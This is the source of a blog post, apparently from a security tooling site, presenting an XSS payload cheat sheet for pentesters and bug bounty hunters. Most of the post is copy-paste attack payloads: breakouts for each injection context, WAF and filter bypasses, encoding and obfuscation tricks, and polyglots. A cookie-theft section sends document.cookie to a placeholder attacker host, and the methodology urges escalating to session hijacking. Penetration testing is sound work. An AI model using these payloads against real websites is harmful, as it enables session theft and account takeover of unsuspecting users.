import type { BlogPost } from "@/lib/blog";

export const meta: BlogPost = {
  slug: "xss-payload-cheat-sheet",
  title: "XSS Payload Cheat Sheet 2026 — Context-Aware Payloads, WAF Bypass, and Filter Evasion",
  description:
    "Complete XSS payload cheat sheet for pentesters and bug bounty hunters. Covers injection contexts, WAF bypass techniques, encoding tricks, polyglot payloads, and filter evasion with copy-paste ready examples.",
  date: "2026-03-22",
  author: "4252nez",
  keywords: [
    "XSS cheat sheet",
    "XSS payloads",
    "cross site scripting payloads",
    "XSS payload list",
    "XSS filter bypass",
    "XSS WAF bypass",
    "XSS encoding",
    "XSS polyglot",
    "XSS pentest",
  ],
  relatedTool: "xss",
};

export function Content() {
  return (
    <>
      <p>
        Cross-Site Scripting (XSS) remains one of the most common web
        vulnerabilities. Successful exploitation depends on understanding the
        injection context, choosing the right payload, and bypassing any filters
        or WAFs in place. This cheat sheet covers every technique you need.
      </p>
      <p>
        Use our <a href="/tools/xss">XSS Payload Generator</a> to automatically
        generate context-aware payloads with encoding and WAF bypass options, or
        keep reading for the full reference.
      </p>

      <h2>Injection Contexts</h2>
      <p>
        The most critical factor in XSS exploitation is understanding where
        your input lands in the HTML response. Each context requires different
        breakout techniques and payload structures.
      </p>
      <table>
        <thead>
          <tr>
            <th>Context</th>
            <th>Example</th>
            <th>Breakout Strategy</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>HTML Body</td>
            <td>{'<div>INJECT</div>'}</td>
            <td>Inject new tags directly</td>
          </tr>
          <tr>
            <td>Double-quoted Attribute</td>
            <td>{'<input value="INJECT">'}</td>
            <td>Close quote, add event handler or close tag</td>
          </tr>
          <tr>
            <td>Single-quoted Attribute</td>
            <td>{"<input value='INJECT'>"}</td>
            <td>Close single quote, add event handler</td>
          </tr>
          <tr>
            <td>Unquoted Attribute</td>
            <td>{'<input value=INJECT>'}</td>
            <td>Space to break value, add new attribute</td>
          </tr>
          <tr>
            <td>JS String (single)</td>
            <td>{"var x = 'INJECT';"}</td>
            <td>Close quote, execute JS, comment rest</td>
          </tr>
          <tr>
            <td>JS String (double)</td>
            <td>{'var x = "INJECT";'}</td>
            <td>Close quote, execute JS, comment rest</td>
          </tr>
          <tr>
            <td>JS Template Literal</td>
            <td>{"var x = `INJECT`;"}</td>
            <td>{"Use ${} expression or close backtick"}</td>
          </tr>
          <tr>
            <td>URL / href</td>
            <td>{'<a href="INJECT">'}</td>
            <td>javascript: protocol or data: URI</td>
          </tr>
          <tr>
            <td>Event Handler</td>
            <td>{'<div onclick="INJECT">'}</td>
            <td>Execute JS directly in handler context</td>
          </tr>
        </tbody>
      </table>

      <h2>HTML Body Payloads</h2>
      <p>
        When your input lands directly in the HTML body, you can inject new HTML
        elements. These are the most straightforward XSS payloads.
      </p>
      <pre>
        <code>{`# Basic script injection
<script>alert(1)</script>

# Image tag with error handler (no interaction needed)
<img src=x onerror=alert(1)>

# SVG with onload (no interaction needed)
<svg onload=alert(1)>

# SVG animate with onbegin
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

# Details element with ontoggle (no interaction)
<details open ontoggle=alert(1)><summary>X</summary></details>

# Input with autofocus (no interaction)
<input autofocus onfocus=alert(1)>

# Body onload
<body onload=alert(1)>

# Iframe with srcdoc
<iframe srcdoc="<script>alert(1)</script>">

# Video source error
<video><source onerror=alert(1)>

# Marquee onstart
<marquee onstart=alert(1)>`}</code>
      </pre>

      <h2>Attribute Breakout Payloads</h2>
      <p>
        When input lands inside an HTML attribute, you need to break out of the
        attribute first, then either add a new event handler or close the tag and
        inject new HTML.
      </p>
      <pre>
        <code>{`# Double-quoted attribute breakout
" onerror=alert(1) "
" autofocus onfocus=alert(1) "
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>

# Single-quoted attribute breakout
' onerror=alert(1) '
' autofocus onfocus=alert(1) '
'><script>alert(1)</script>
'><img src=x onerror=alert(1)>

# Unquoted attribute breakout
 onerror=alert(1)
 autofocus onfocus=alert(1)
><script>alert(1)</script>`}</code>
      </pre>

      <h2>JavaScript String Breakout</h2>
      <p>
        When input lands inside a JavaScript string, you need to close the string
        delimiter and inject new JavaScript statements.
      </p>
      <pre>
        <code>{`# Single-quoted JS string
';alert(1);//
';alert(1);var a='

# Double-quoted JS string
";alert(1);//
";alert(1);var a="

# Template literal
\${alert(1)}
\`;alert(1);//

# Close script block (works in any JS context)
</script><script>alert(1)</script>`}</code>
      </pre>

      <h2>URL Context Payloads</h2>
      <p>
        When input lands inside a URL attribute (href, src, action), you can use
        the javascript: protocol or data: URIs.
      </p>
      <pre>
        <code>{`# JavaScript protocol
javascript:alert(1)

# JavaScript protocol with HTML entities
javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)

# Tab character bypass
java	script:alert(1)

# Data URI
data:text/html,<script>alert(1)</script>

# Data URI with base64
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`}</code>
      </pre>

      <h2>WAF Bypass Techniques</h2>
      <p>
        Web Application Firewalls use regex patterns to block XSS. These
        techniques exploit parser differences between WAFs and browsers.
      </p>

      <h3>Case Variation</h3>
      <pre>
        <code>{`<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>`}</code>
      </pre>

      <h3>Whitespace Insertion</h3>
      <pre>
        <code>{`# Newlines between attributes
<img
src=x
onerror=alert(1)>

# Tabs between attributes
<img	src=x	onerror=alert(1)>

# Forward slash instead of space
<svg/onload=alert(1)>`}</code>
      </pre>

      <h3>Uncommon Tags and Events</h3>
      <pre>
        <code>{`# Less commonly filtered elements
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<svg><set onbegin=alert(1) attributename=x>
<body onpageshow=alert(1)>
<select autofocus onfocus=alert(1)>
<marquee behavior=alternate onfinish=alert(1)>x</marquee>`}</code>
      </pre>

      <h3>Parentheses-Free Execution</h3>
      <pre>
        <code>{`# Backtick invocation (no parentheses)
<script>alert\`1\`</script>
<img src=x onerror=alert\`1\`>

# throw + onerror
<img src=x onerror="throw onerror=alert,1">

# Constructor chain
<img src=x onerror=[]["filter"]["constructor"]("alert(1)")()>`}</code>
      </pre>

      <h3>Double Tag Trick</h3>
      <pre>
        <code>{`# Survives single-pass tag stripping
<scr<script>ipt>alert(1)</script>`}</code>
      </pre>

      <h2>Encoding Techniques</h2>
      <p>
        Encoding can help bypass filters that look for specific character
        patterns. The browser decodes the payload before executing it.
      </p>
      <table>
        <thead>
          <tr>
            <th>Encoding</th>
            <th>Example (alert(1))</th>
            <th>Use Case</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>URL</td>
            <td>%61%6C%65%72%74%28%31%29</td>
            <td>URL parameters, path segments</td>
          </tr>
          <tr>
            <td>Double URL</td>
            <td>%2561%256C%2565%2572%2574%2528%2531%2529</td>
            <td>When app decodes once before WAF checks</td>
          </tr>
          <tr>
            <td>HTML Entities</td>
            <td>{'&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'}</td>
            <td>Inside HTML attributes, event handlers</td>
          </tr>
          <tr>
            <td>Hex (JS)</td>
            <td>\x61\x6c\x65\x72\x74\x28\x31\x29</td>
            <td>Inside JavaScript strings</td>
          </tr>
          <tr>
            <td>Unicode (JS)</td>
            <td>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</td>
            <td>Inside JavaScript strings</td>
          </tr>
          <tr>
            <td>fromCharCode</td>
            <td>String.fromCharCode(97,108,101,114,116,40,49,41)</td>
            <td>Build string dynamically in JS</td>
          </tr>
          <tr>
            <td>Base64</td>
            <td>{'atob(\'YWxlcnQoMSk=\')'}</td>
            <td>Obfuscate payload contents</td>
          </tr>
        </tbody>
      </table>

      <h2>Polyglot Payloads</h2>
      <p>
        Polyglot payloads work across multiple injection contexts. Use them when
        you are unsure where your input lands.
      </p>
      <pre>
        <code>{`# Minimal polyglot (attribute + HTML body)
'"><svg/onload=alert(1)>//

# Attribute + JS polyglot
'"><img src=x onerror=alert(1)>//";\nalert(1);//

# Multi-context polyglot
-->'\"</sCript><svg onload=alert(1)>`}</code>
      </pre>

      <h2>Cookie Theft Payloads</h2>
      <p>
        These payloads exfiltrate cookies to an attacker-controlled server.
        Replace ATTACKER.com with your server.
      </p>
      <pre>
        <code>{`# Fetch API
<script>fetch('https://ATTACKER.com/?c='+document.cookie)</script>

# Image tag
<img src=x onerror="new Image().src='https://ATTACKER.com/?c='+document.cookie">

# XMLHttpRequest
<script>var x=new XMLHttpRequest();x.open('GET','https://ATTACKER.com/?c='+document.cookie);x.send()</script>`}</code>
      </pre>

      <h2>Event Handlers Reference</h2>
      <p>
        A comprehensive list of event handlers that can trigger JavaScript
        execution, organized by whether they require user interaction.
      </p>
      <table>
        <thead>
          <tr>
            <th>Event</th>
            <th>Interaction</th>
            <th>Tags</th>
          </tr>
        </thead>
        <tbody>
          <tr><td>onerror</td><td>None</td><td>img, video, audio, source, object, script</td></tr>
          <tr><td>onload</td><td>None</td><td>body, img, svg, iframe, link, style</td></tr>
          <tr><td>onfocus</td><td>None (with autofocus)</td><td>input, select, textarea, a, button</td></tr>
          <tr><td>onbegin</td><td>None</td><td>svg animate, set</td></tr>
          <tr><td>ontoggle</td><td>None (with open)</td><td>details</td></tr>
          <tr><td>onstart</td><td>None</td><td>marquee</td></tr>
          <tr><td>onpageshow</td><td>None</td><td>body</td></tr>
          <tr><td>onclick</td><td>Click</td><td>any element</td></tr>
          <tr><td>onmouseover</td><td>Hover</td><td>any element</td></tr>
          <tr><td>onmouseenter</td><td>Hover</td><td>any element</td></tr>
          <tr><td>onblur</td><td>Focus then unfocus</td><td>input, select, textarea, contenteditable</td></tr>
          <tr><td>onfinish</td><td>None (on loop end)</td><td>marquee</td></tr>
        </tbody>
      </table>

      <h2>Testing Methodology</h2>
      <p>
        A systematic approach to finding and exploiting XSS vulnerabilities:
      </p>
      <ol>
        <li><strong>Identify input reflection points</strong> — search the response HTML for your input string</li>
        <li><strong>Determine the injection context</strong> — is it in HTML body, attribute, JS, or URL?</li>
        <li><strong>Test basic payloads</strong> — start with the simplest payload for the context</li>
        <li><strong>Identify filtered characters</strong> — try angle brackets, quotes, parentheses, event handler keywords</li>
        <li><strong>Apply bypass techniques</strong> — encoding, case variation, alternate tags/events, WAF-specific tricks</li>
        <li><strong>Escalate</strong> — once XSS is confirmed, escalate from alert() to cookie theft, session hijacking, or CSRF</li>
      </ol>

      <p>
        For hands-on payload generation with all these techniques built in, try our{" "}
        <a href="/tools/xss">XSS Payload Generator</a>. It lets you select your
        injection context, choose an action, apply encoding, and generate payloads
        tailored to specific WAFs — all in your browser with nothing sent to any server.
      </p>
    </>
  );
}
